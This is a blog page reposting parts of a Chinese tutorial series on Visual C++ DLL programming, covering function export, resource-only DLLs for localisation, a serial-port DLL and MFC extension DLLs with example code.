<td>#ifndef FFT_H
#define FFT_H#include &lt;complex&gt;

using namespace std;
extern &#8220;C&#8221; void __declspec(dllexport) __stdcall FFT(complex&lt;double&gt; * TD, complex&lt;double&gt; * FD, int r);

#define PI 3.1415926
#endif

fft.cpp的源代码为：

/* 文件名：fft.cpp　*/

#include &#8220;fft.h&#8221;
void __stdcall FFT(complex&lt;double&gt; * TD, complex&lt;double&gt; * FD, int r)
{
　…//读者提供的函数代码
}</td>
</tr>
</table>


<p class="guanggao">　　在任何编程语言中使用Win32 API LoadLibrary都可以加载这个DLL，而使用GetProcAddress(hDll, &#8220;FFT&#8221;)则可以获得函数FFT的地址，读者所提到的Delphi当然也不例外。</p>


<p>　　这个DLL中有两点需要注意：</p>

<p>　　（1）使用extern &ldquo;C&#8221;修饰函数声明，否则，生成的DLL只能供C++调用；</p>

<p>　　（2）使用<strong>stdcall修饰函数声明及定义，</strong>stdcall是Windows API的函数调用方式。</p>

<p class="guanggao">　　<strong>7.2纯资源DLL</strong></p>


<p>　　我们在应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>中产生如图18所示的资源（对话框），<a target="_blank" href="http://www.mydown.com/code/244/244785.html"><font color="#d52b2b">单击此处下载本工程</font></a>。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/76j85iz4679p.jpg" />
图18 中文对话框</td>
</tr>
</table>


<p>　　在与这个应用程序相同的工作区里利用MFC向导建立两个简单的DLL，把应用工程中的资源全选后分别拷贝到ChineseDll和EngLishDll，在EnglishDll工程的资源文件中搜索下面的语句：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/////////////////////////////////////////////////////////////////////////////// Chinese (P.R.C.) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
#ifdef _WIN32
LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
#pragma code_page(936)
#endif //_WIN32</td>
</tr>
</table>


<p>　　将其改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/////////////////////////////////////////////////////////////////////////////
// English (U.S.) resources#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
#ifdef _WIN32

LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#pragma code_page(1252)
#endif //_WIN32</td>
</tr>
</table>


<p>　　并将其中所有的中文翻译为英文。这个DLL为我们提供了如图19所示的对话框资源。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/53b44x05f4i0.jpg" />
图19英文对话框</td>
</tr>
</table>


<p>　　修改应用工程的InitInstance()函数，在</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>CResourceDllCallDlg dlg;
m_pMainWnd = &amp;dlg;
int nResponse = dlg.DoModal();</td>
</tr>
</table>


<p>　　之前（即对话框显示之前）添加如下代码：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//获取<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>的语言WORD wLangPID = PRIMARYLANGID( GetSystemDefaultLangID() );
if( LANG_CHINESE == wLangPID )
{
　hLanguageDll = LoadLibrary( &#8220;ChineseDll.dll&#8221; ); //加载中文资源
}
else
{
　hLanguageDll = LoadLibrary( &#8220;EnglishDll.dll&#8221; ); //加载英文资源
}

if( NULL == hLanguageDll )
{
　AfxMessageBox( &#8220;Load DLL failure&#8221; );
　return FALSE;
}
AfxSetResourceHandle( hLanguageDll ); //设置当前的资源句柄</td>
</tr>
</table>


<p>　　这样的应用程序将具有自适应性质，在中文OS中显示中文资源，在英文OS中则显示英文资源。
　　<strong>7.3通信控制DLL</strong></p>

<p>　　我们在这里举一个串口通信类的例子。</p>

<p>　　也许您需要了解一点串口通信的背景知识，其实串口到处都看得到，譬如PC机的COM口即为串行通讯口（简称串口）。如图20，打开Windows的设备管理器，我们看到了COM口。</p>

<p>　　在Windows系统，需通过DCB(Device Control Block)对串口进行配置。利用Windows API GetCommState函数可以获取串口当前配置；利用SetCommState函数则可以设置串口通讯的参数。</p>

<p>　　串行通信通常按以下四步进行：</p>

<p>　　(1)打开串口；</p>

<p>　　(2)配置串口；</p>

<p>　　(3)数据传送；</p>

<p>　　(4)关闭串口。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/2b6sfwuq08kz.jpg" />
图20 PC的串口</td>
</tr>
</table>


<p>　　由此可见，我们需要给串口控制DLL提供如下四个接口函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//打开指定的串口，其参数port为端口号BOOL ComOpen(int port); //在这个函数里使用默认的参数设置串口

//将打开的串口关闭

void ComClose(int port);

//将串口接收缓冲区中的数据放到buffer中

int GetComData(char *buf, int buf_len);

//将指定长度的数据发送到串口

int SendDataToCom(LPBYTE buf,int buf_Len);</td>
</tr>
</table>


<p>　　下面给出了DLL接口的主要源代码框架：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//com.h：com类通信接口class AFX_EXT_CLASS com
{
　public:
　　ComOpen(int port)
　　{
　　　…
　　}
　　int SendDataToCom(LPBYTE buf,int buf_Len)
　　{
　　　…
　　}
　　int GetComData(char *buf, int buf_len)
　　{
　　　…
　　}
　　void ComClose()
　　{
　　　…
　　}
　}</td>
</tr>
</table>


<p>　　我们编写一控制台<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>来演示DLL的调用：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;iostream&gt;
#include &lt;exception&gt;using namespace std;

#include &lt;windows.h&gt;
#include &#8220;com.h&#8221; //包含DLL中导出类的头文件 int main(int argc, char *argv[])
{
　try
　{
　　char str[] = &#8220;com_class test&#8221;;
　　com com1;
　　com1.ComOpen (1);
　　for(int i=0; i&lt;100; i++) //以同步方式写com的buffer
　　{
　　　Sleep(500);
　　　com1.SendDataToCom (str,strlen(str));
　　}
　　com1.ComClose ();
　}
　catch(exception &amp;e)
　{
　　cout &lt;&lt; e.what() &lt;&lt; endl;
　}
　return 0;
}</td>
</tr>
</table>


<p>　　DLL的编写与调用方法及主要应用皆已讲完，在下一节里，我们将看到比较“高深”的主题――DLL木马。曾几何时，DLL木马成为了病毒的一种十分重要的形式，是DLL的什么特性使得它能够成为一种病毒？下一节我们将揭晓谜底。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:19:07+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-liu//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-wu/">
		
			Visual C++动态链接库编程（五）</a>
	</h2>
	<div class="entry-content">
		<p>　　前文我们对非MFC DLL和MFC规则DLL进行了介绍，现在开始详细分析DLL的最后一种类型――MFC扩展DLL。</p>

<p>　　<strong>6.1概论</strong></p>

<p>　　MFC扩展DLL与MFC规则DLL的相同点在于在两种DLL的内部都可以使用MFC类库，其不同点在于MFC扩展DLL与应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>的接口可以是MFC的。MFC扩展DLL的含义在于它是MFC的扩展，其主要功能是实现从现有MFC库类中派生出可重用的类。MFC扩展DLL使用MFC 动态链接库版本，因此只有用共享MFC 版本生成的MFC 可执行文件（应用程序或规则DLL）才能使用MFC扩展DLL。</p>

<p class="guanggao">　　从前文可知，MFC规则DLL被MFC向导自动添加了一个CWinApp的对象，而MFC扩展DLL则不包含该对象，它只是被自动添加了DllMain 函数。对于MFC扩展DLL，开发人员必须在DLL的DllMain函数中添加初始化和结束代码。</p>


<p>　　从下表我们可以看出三种DLL对DllMain入口函数的不同处理方式：</p>

<p><p class="guanggao">
<table border="1" align="center" width="90%" cellPadding="2" cellSpacing="0">
<tr>
<td>DLL类型</td>
<td>入口函数</td>
</tr>
<tr>
<td>非 MFC DLL</td>
<td>编程者提供DllMain函数</td>
</tr>
<tr>
<td>MFC规则 DLL</td>
<td>CWinApp对象的InitInstance 和 ExitInstance</td>
</tr>
<tr>
<td>MFC扩展 DLL</td>
<td>MFC DLL向导生成DllMain 函数</td>
</tr>
</table>
<p class="guanggao">　　对于MFC扩展DLL，系统会自动在工程中添加如下表所示的宏，这些宏为DLL和应用程序的编写提供了方便。像AFX_EXT_CLASS、AFX_EXT_API、AFX_EXT_DATA这样的宏，在DLL和应用程序中将具有不同的定义，这取决于<em>AFXEXT宏是否被定义。这使得在DLL和应用程序中，使用统一的一个宏就可以表示出输出和输入的不同意思。在DLL中，表示输出（因为</em>AFXEXT被定义，通常是在编译器的标识参数中指定/D_AFXEXT）；在应用程序中，则表示输入（_AFXEXT没有定义）。</p></p>

<p><p class="guanggao">
<table border="1" align="center" width="90%" cellPadding="2" cellSpacing="0">
<tr>
<td>宏</td>
<td>定义</td>
</tr>
<tr>
<td>AFX_CLASS_IMPORT</td>
<td><strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_API_IMPORT</td>
<td></strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_DATA_IMPORT</td>
<td><strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_CLASS_EXPORT</td>
<td></strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_API_EXPORT</td>
<td><strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_DATA_EXPORT</td>
<td></strong>declspec(dllexport)</td>
</tr>
<tr>
<td>AFX_EXT_CLASS</td>
<td>#ifdef _AFXEXT
　AFX_CLASS_EXPORT</p>

<h1>else</h1>

<p>　AFX_CLASS_IMPORT</td>
</tr>
<tr>
<td>AFX_EXT_API</td>
<td>#ifdef _AFXEXT
　AFX_API_EXPORT</p>

<h1>else</h1>

<p>　AFX_API_IMPORT</td>
</tr>
<tr>
<td>AFX_EXT_DATA</td>
<td>#ifdef _AFXEXT
　AFX_DATA_EXPORT</p>

<h1>else</h1>

<p>　AFX_DATA_IMPORT</td>
</tr>
</table>
<p class="guanggao">　　<strong>6.2 MFC扩展DLL导出MFC派生类</strong></p>
　　在这个例子中，我们将产生一个名为“ExtDll”的MFC扩展DLL工程，在这个DLL中导出一个对话框类，这个对话框类派生自MFC类CDialog。</p>

<p>　　使用MFC向导生成MFC扩展DLL时，系统会自动添加如下代码：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>static AFX_EXTENSION_MODULE ExtDllDLL = { NULL, NULL };
extern &ldquo;C&rdquo; int APIENTRYDllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
　// Remove this if you use lpReserved</p>

<p>　UNREFERENCED_PARAMETER( lpReserved );</p>

<p>　//说明：lpReserved是一个被系统所保留的参数，对于隐式链接是一个非零值，对于显式链接值是零</p>

<p>　if (dwReason == DLL_PROCESS_ATTACH)
　{
　　TRACE0( &ldquo;EXTDLL.DLL Initializing!\n&rdquo; );
　　// Extension DLL one-time initialization
　　if ( !AfxInitExtensionModule( ExtDllDLL, hInstance ))
　　　return 0;
　　　// Insert this DLL into the resource chain
　　new CDynLinkLibrary( ExtDllDLL );
　}
　else if (dwReason == DLL_PROCESS_DETACH)
　{
　　TRACE0( &ldquo;EXTDLL.DLL Terminating!\n&rdquo; );
　　// Terminate the library before destructors are called
　　AfxTermExtensionModule( ExtDllDLL );
　}
　return 1; // ok
}</td>
</tr>
</table>
<p class="guanggao">　　这一段代码含义晦涩，我们需要对其进行解读：</p>
　　（1）上述代码完成MFC扩展DLL的初始化和终止处理；</p>

<p>　　（2）初始化期间所创建的 CDynLinkLibrary 对象使MFC扩展 DLL 可以将 DLL中的CRuntimeClass 对象或资源导出到应用程序；</p>

<p>　　（3）AfxInitExtensionModule函数捕获模块的CRuntimeClass 结构和在创建 CDynLinkLibrary 对象时使用的对象工厂（COleObjectFactory 对象）；</p>

<p>　　（4）AfxTermExtensionModule函数使 MFC 得以在每个进程与扩展 DLL 分离时（进程退出或使用AfxFreeLibrary卸载DLL时）清除扩展 DLL；</p>

<p>　　（5）第一条语句static AFX_EXTENSION_MODULE ExtDllDLL = { NULL, NULL };定义了一个AFX_EXTENSION_MODULE类的静态全局对象，AFX_EXTENSION_MODULE的定义如下：</p>

<p><p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>struct AFX_EXTENSION_MODULE
{
　BOOL bInitialized;
　HMODULE hModule;
　HMODULE hResource;
　CRuntimeClass<em> pFirstSharedClass;
　COleObjectFactory</em> pFirstSharedFactory;
};</td>
</tr>
</table>
<p class="guanggao">　　由AFX_EXTENSION_MODULE的定义我们可以更好的理解（2）、（3）、（4）点。</p>
　　在资源编辑器中添加一个如图15所示的对话框，并使用MFC类向导为其添加一个对应的类CExtDialog，系统自动添加了ExtDialog.h和ExtDialog.cpp两个头文件。
<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="376" src="http://dev.yesky.com/imagelist/05/10/z44bxd805tf3.jpg" height="219" /><img border="0" width="376" src="http://dev.yesky.com/imagelist/05/10/z44bxd805tf3.jpg" height="219" />
图15 MFC扩展DLL中的对话框</td>
</tr>
</table>
<p class="guanggao">　　修改ExtDialog.h中CExtDialog类的声明为：</p></p>

<p><p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class AFX_EXT_CLASS CExtDialog : public CDialog
{
　public:
　　CExtDialog( CWnd<em> pParent = NULL );
　　enum { IDD = IDD_DLL_DIALOG };
　protected:
　　virtual void DoDataExchange( CDataExchange</em> pDX );
　　DECLARE_MESSAGE_MAP()
};</td>
</tr>
</table>
<p class="guanggao">　　这其中最主要的改变是我们在class AFX_EXT_CLASS CExtDialog语句中添加了“AFX_EXT_CLASS”宏，则使得DLL中的CExtDialog类被导出。</p>
<p class="guanggao">　　<strong>6.3 MFC扩展DLL的加载</strong></p>
　　6.3.1 隐式加载</p>

<p>　　我们在6.2工程所在的工作区中添加一个LoadExtDllDlg工程，用于演示MFC扩展DLL的加载。在LoadExtDllDlg工程中添加一个如图16所示的对话框，这个对话框上包括一个“调用DLL”按钮。
<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="394" src="http://dev.yesky.com/imagelist/05/10/4o3b052d7377.jpg" height="138" /><img border="0" width="394" src="http://dev.yesky.com/imagelist/05/10/4o3b052d7377.jpg" height="138" />
图16 MFC扩展DLL调用工程中的对话框</td>
</tr>
</table>
　　在与图16对应对话框类实现文件的头部添加：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>// LoadExtDllDlg.cpp : implementation file
//#include &ldquo;..\ExtDialog.h&rdquo;</p>

<h1>pragma comment( lib, &ldquo;ExtDll.lib&rdquo; )</h1>

<p>而“调用DLL”按钮的单击事件的消息处理函数为：</p>

<p>void CLoadExtDllDlg::OnDllcallButton()
{
　CExtDialog extDialog;
　extDialog.DoModal();
}</td>
</tr>
</table>
　　当我们单击“调用DLL”的时候，弹出了如图15的对话框。</p>

<p>　　为提供给用户隐式加载（MFC扩展DLL一般使用隐式加载，具体原因见下节），MFC扩展DLL需要提供三个文件：</p>

<p>　　（1）描述DLL中扩展类的头文件；</p>

<p>　　（2）与动态链接库对应的.LIB文件；</p>

<p>　　（3）动态链接库.DLL文件本身。</p>

<p>　　有了这三个文件，应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>的开发者才可充分利用MFC扩展DLL。</p>

<p>　　6.3.2 显示加载</p>

<p>　　显示加载MFC扩展DLL应使用MFC全局函数AfxLoadLibrary而不是WIN32 API中的LoadLibrary。AfxLoadLibrary 最终也调用了 LoadLibrary这个API，但是在调用之前进行了线程同步的处理。</p>

<p>　　AfxLoadLibrary 的函数原型与 LoadLibrary完全相同，为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>HINSTANCE AFXAPI AfxLoadLibrary( LPCTSTR lpszModuleName );</td>
</tr>
</table>
　　与之相对应的是，MFC 应用程序应使用AfxFreeLibrary 而非FreeLibrary 卸载MFC扩展DLL。AfxFreeLibrary的函数原型也与 FreeLibrary完全相同，为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>BOOL AFXAPI AfxFreeLibrary( HINSTANCE hInstLib );</td>
</tr>
</table>
　　如果我们把上例中的“调用DLL”按钮单击事件的消息处理函数改为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CLoadExtDllDlg::OnDllcallButton()
{
　HINSTANCE hDll = AfxLoadLibrary( &ldquo;ExtDll.dll&rdquo; );
　if(NULL == hDll)
　{
　　AfxMessageBox( &ldquo;MFC扩展DLL动态加载失败&rdquo; );
　　return;
　}　CExtDialog extDialog;
　extDialog.DoModal();
　AfxFreeLibrary(hDll);
}</td>
</tr>
</table>
　　则工程会出现link错误：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>LoadExtDllDlg.obj : error LNK2001: unresolved external symbol &ldquo;<strong>declspec(dllimport) public: virtual </strong>thiscall CExtDialog::~CExtDialog(void)&rdquo; (<strong>imp_??1CExtDialog@@UAE@XZ)LoadExtDllDlg.obj : error LNK2001: unresolved external symbol &ldquo;</strong>declspec(dllimport) public: <strong>thiscall CExtDialog::CExtDialog(class CWnd *)&rdquo; (</strong>imp_??0CExtDialog@@QAE@PAVCWnd@@@Z)</td>
</tr>
</table>
　　提示CExtDialog的构造函数和析构函数均无法找到！是的，对于派生MFC类的MFC扩展DLL，当我们要在应用程序中使用DLL中定义的派生类时，我们不宜使用动态加载DLL的方法。</p>

<p>　　<strong>6.4 MFC扩展DLL加载MFC扩展DLL</strong></p>

<p>　　我们可以在MFC扩展DLL中再次使用MFC扩展DLL，但是，由于在两个DLL中对于AFX_EXT_CLASS、AFX_EXT_API、AFX_EXT_DATA宏的定义都是输出，这会导致调用的时候出现问题。</p>

<p>　　我们将会在调用MFC扩展DLL的DLL中看到link错误：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>error LNK2001: unresolved external symbol …&hellip;&hellip;.</td>
</tr>
</table>
　　因此，在调用MFC扩展DLL的MFC扩展DLL中，在包含被调用DLL的头文件之前，需要临时重新定义AFX_EXT_CLASS的值。下面的例子显示了如何实现：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//临时改变宏的含义“输出”为“输入”#undef AFX_EXT_CLASS</p>

<h1>undef AFX_EXT_API</h1>

<h1>undef AFX_EXT_DATA</h1>

<h1>define AFX_EXT_CLASS AFX_CLASS_IMPORT</h1>

<h1>define AFX_EXT_API AFX_API_IMPORT</h1>

<h1>define AFX_EXT_DATA AFX_DATA_IMPORT</h1>

<p>//包含被调用MFC扩展DLL的头文件</p>

<h1>include &ldquo;CalledDLL.h&rdquo;</h1>

<p>//恢复宏的含义为输出</p>

<h1>undef AFX_EXT_CLASS</h1>

<h1>undef AFX_EXT_API</h1>

<h1>undef AFX_EXT_DATA</h1>

<h1>define AFX_EXT_CLASS AFX_CLASS_EXPORT</h1>

<h1>define AFX_EXT_API AFX_API_EXPORT</h1>

<h1>define AFX_EXT_DATA AFX_DATA_EXPORT</td></h1>

<p></tr>
</table>
　　<strong>6.5 MFC扩展DLL导出函数和变量</strong></p>

<p>　　MFC扩展DLL导出函数和变量的方法也十分简单，下面我们给出一个简单的例子。</p>

<p>　　我们在MFC向导生成的MFC扩展DLL工程中添加gobal.h和global.cpp两个文件：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//global.h:MFC扩展DLL导出变量和函数的声明extern &ldquo;C&rdquo;
{
　int AFX_EXT_DATA total; //导出变量
　int AFX_EXT_API add( int x, int y ); //导出函数
}</p>

<p>//global.cpp:MFC扩展DLL导出变量和函数定义</p>

<h1>include &ldquo;StdAfx.h&rdquo;</h1>

<h1>include &ldquo;global.h&rdquo;</h1>

<p>extern &ldquo;C&rdquo; int total;
int add(int x,int y)
{
　total = x + y;
　return total;
}</td>
</tr>
</table>
　　编写一个简单的控制台<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>来调用这个MFC扩展DLL：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;iostream.h&gt;</p>

<h1>include &lt;afxver<em>.h&gt;//AFX_EXT_DATA、AFX_EXT_API宏的定义在afxver</em>.h头文件中</h1>

<h1>pragma comment ( lib, &ldquo;ExtDll.lib&rdquo; )</h1>

<h1>include &ldquo;..\global.h&rdquo;</h1>

<p>int main(int argc, char* argv[])
{
　cout &lt;&lt; add(2,3) &lt;&lt; endl;
　cout &lt;&lt; total;
　return 0;
}</td>
</tr>
</table>
　　运行程序，在控制台上看到：</p>

<p>　　5</p>

<p>　　5</p>

<p>　　另外，在Visual C++下建立MFC扩展DLL时，MFC DLL向导会自动生成.def文件。因此，对于函数和变量，我们除了可以利用AFX_EXT_DATA、AFX_EXT_API宏导出以外，在.def文件中定义导出也是一个很好的办法。与之相比，在.def文件中导出类却较麻烦。通常需要从工程生成的.map文件中获得类的所有成员函数被C++编译器更改过的标识符，并且在.def文件中导出这些“奇怪”的标识符。因此，MFC扩展DLL通常以AFX_EXT_CLASS宏直接声明导出类。</p>

<p>　　<strong>6.6 MFC扩展DLL的应用</strong></p>

<p>　　上述各小节所举MFC扩展DLL的例子均只是为了说明某方面的问题，没有真实地体现“MFC扩展” 的内涵，譬如6.2派生自CDialog的类也不具备比CDialog更强的功能。MFC扩展DLL的真实内涵体现在它提供的类虽然派生自MFC类，但是提供了比MFC类更强大的功能、更丰富的接口。下面我们来看一个具体的例子（<a target="_blank" href="http://www.mydown.com/code/244/244724.html"><font color="#dd2222">单击此处下载本工程</font></a>）。</p>

<p>　　我们知道static控件所对应的CStatic类不具备设置背景和文本颜色的接口，这使得我们不能在对话框或其它用户界面上自由灵活地修改static控件的颜色风格，因此我们需要一个提供了SetBackColor和SetTextColor接口的CStatic派生类CMultiColorStatic。
　
　　这个类的声明如下：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>class AFX_EXT_CLASS CMultiColorStatic : public CStatic
{
　// Construction　public:
　　CMultiColorStatic();
　　virtual ~CMultiColorStatic();
　　// Attributes
　protected:
　　CString m_strCaption;
　　COLORREF m_BackColor;
　　COLORREF m_TextColor;
　　// Operations
　public:
　　void SetTextColor( COLORREF TextColor );
　　void SetBackColor( COLORREF BackColor );
　　void SetCaption( CString strCaption );</p>

<p>　　// Generated message map functions
　protected:
　　afx_msg void OnPaint();
　　DECLARE_MESSAGE_MAP()
};</td>
</tr>
</table>
　　在这个类的实现文件中，我们需要为它提供WM_PAINT消息的处理函数（这是因为颜色的设置依赖于WM_PAINT消息）：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>BEGIN_MESSAGE_MAP(CMultiColorStatic, CStatic)//{ {AFX_MSG_MAP(CMultiColorStatic)
　ON_WM_PAINT() //为这个类定义WM_PAINT消息处理函数
//}}AFX_MSG_MAP
END_MESSAGE_MAP()</td>
</tr>
</table>
　　下面是这个类中的重要成员函数：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//为CMultiColorStatic类添加“设置文本颜色”接口void CMultiColorStatic::SetTextColor( COLORREF TextColor )
{
　m_TextColor = TextColor; //设置文字颜色
}</p>

<p>//为CMultiColorStatic类添加“设置背景颜色”接口</p>

<p>void CMultiColorStatic::SetBackColor( COLORREF BackColor )
{
　m_BackColor = BackColor; //设置背景颜色
}</p>

<p>//为CMultiColorStatic类添加“设置标题”接口</p>

<p>void CMultiColorStatic::SetCaption( CString strCaption )
{
　m_strCaption = strCaption;
}</p>

<p>//重画Static，颜色和标题的设置都依赖于这个函数</p>

<p>void CMultiColorStatic::OnPaint()
{
　CPaintDC dc(this); // device context for painting
　CRect rect;
　GetClientRect( &amp;rect );
　dc.SetBkColor( m_BackColor );
　dc.SetBkMode( TRANSPARENT );
　CFont <em>pFont = GetParent()-&gt;GetFont();//得到父窗体的字体
　CFont </em>pOldFont;
　pOldFont = dc.SelectObject( pFont );//选用父窗体的字体
　dc.SetTextColor( m_TextColor );//设置文本颜色
　dc.DrawText( m_strCaption, &amp;rect, DT_CENTER );//文本在Static中央
　dc.SelectObject( pOldFont );
}</td>
</tr>
</table>
　　为了验证CMultiColorStatic类，我们制作一个基于对话框的应用程序，它包含一个如图17所示的对话框。该对话框上包括一个static控件和三个按钮，这三个按钮可分别把static控件设置为“红色”、“蓝色”和“绿色”。
<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="333" src="http://dev.yesky.com/imagelist/05/10/ui4t07vro853.jpg" height="166" /><img border="0" width="333" src="http://dev.yesky.com/imagelist/05/10/ui4t07vro853.jpg" height="166" />
图17 扩展的CStatic类调用演示</td>
</tr>
</table>
　　下面看看应如何编写与这个对话框对应的类。</p>

<p>　　包含这种Static的对话框类的声明如下：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &ldquo;..\MultiColorStatic.h&rdquo;</p>

<h1>pragma comment ( lib, &ldquo;ColorStatic.lib&rdquo; )// CCallDllDlg dialog</h1>

<p>class CCallDllDlg : public CDialog
{
　public:
　　CCallDllDlg(CWnd<em> pParent = NULL); // standard constructor
　　enum { IDD = IDD_CALLDLL_DIALOG };
　　CMultiColorStatic m_colorstatic; //包含一个CMultiColorStatic的实例
　protected:
　　virtual void DoDataExchange(CDataExchange</em> pDX);//DDX/DDV support
　　HICON m_hIcon;</p>

<p>　// Generated message map functions
　//{ {AFX_MSG(CCallDllDlg)</p>

<p>　virtual BOOL OnInitDialog();
　afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
　afx_msg void OnPaint();
　afx_msg HCURSOR OnQueryDragIcon();
　afx_msg void OnRedButton();
　afx_msg void OnBlueButton();
　afx_msg void OnGreenButton();
//}}AFX_MSG
DECLARE_MESSAGE_MAP()
};</td>
</tr>
</table>
　　下面是这个类中与使用CMultiColorStatic相关的主要成员函数：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CCallDllDlg::DoDataExchange(CDataExchange* pDX)
{
　CDialog::DoDataExchange(pDX);
　//{ {AFX_DATA_MAP(CCallDllDlg)
　　DDX_Control(pDX, IDC_COLOR_STATIC, m_colorstatic);
　//使m_colorstatic与IDC_COLOR_STATIC控件关联
　//}}AFX_DATA_MAP
}BOOL CCallDllDlg::OnInitDialog()
{
　…
　// TODO: Add extra initialization here</p>

<p>　// 初始static控件的显示</p>

<p>　m_colorstatic.SetCaption(&ldquo;最开始为黑色&rdquo;);
　m_colorstatic.SetTextColor(RGB(0,0,0));
　return TRUE; // return TRUE unless you set the focus to a control
}</p>

<p>//设置static控件文本颜色为红色</p>

<p>void CCallDllDlg::OnRedButton()
{
　m_colorstatic.SetCaption( &ldquo;改变为红色&rdquo; );
　m_colorstatic.SetTextColor( RGB( 255, 0, 0 ) );
　Invalidate( TRUE ); //导致发出WM_PAINT消息
}</p>

<p>//设置static控件文本颜色为蓝色</p>

<p>void CCallDllDlg::OnBlueButton()
{
　m_colorstatic.SetCaption( &ldquo;改变为蓝色&rdquo; );
　m_colorstatic.SetTextColor( RGB( 0, 0, 255 ) );
　Invalidate( TRUE ); //导致发出WM_PAINT消息
}</p>

<p>//设置static控件文本颜色为绿色</p>

<p>void CCallDllDlg::OnGreenButton()
{
　m_colorstatic.SetCaption( &ldquo;改变为绿色&rdquo; );
　m_colorstatic.SetTextColor( RGB(0,255,0) );
　Invalidate( TRUE ); //导致发出WM_PAINT消息
}</td>
</tr>
</table>
　　至此，我们已经讲解完成了所有类型的动态链接库，即非MFC DLL、MFC规则DLL和MFC扩展DLL。下一节将给出DLL的三个工程实例，与读者朋友们共同体会DLL的应用范围和使用方法。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:14:54+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-wu//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-si/">
		
			Visual C++动态链接库编程（四）</a>
	</h2>
	<div class="entry-content">
		<p>第4节我们对非MFC DLL进行了介绍，这一节将详细地讲述MFC规则DLL的创建与使用技巧。</p>

